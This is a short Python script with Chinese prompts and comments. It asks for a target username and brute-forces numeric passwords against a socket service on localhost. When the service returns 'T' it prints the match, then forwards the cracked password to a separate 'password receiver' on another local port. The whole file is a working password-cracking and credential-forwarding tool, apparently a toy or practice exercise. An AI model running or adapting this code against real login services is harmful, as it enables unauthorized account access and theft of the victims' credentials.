import socket,os
p=socket.socket()
p.connect(('127.0.0.1',1234))
us = input("输入要破解的用户名：")
for i in range(99999,99999999,1):
	sed = us + ' ' + str(i)
	p.send(sed.encode())
	rec=p.recv(1).decode()
	#服务端返回T说明密码正确
	if rec == "T":
		print("密码是：",i)
		break
p.close()
#发送给密码接收器
p = socket.socket()
p.connect(('127.0.0.1',6666))
pasd = "密码是：" + str(i)
p.send(pasd.encode())
p.close()
os.system("pause")
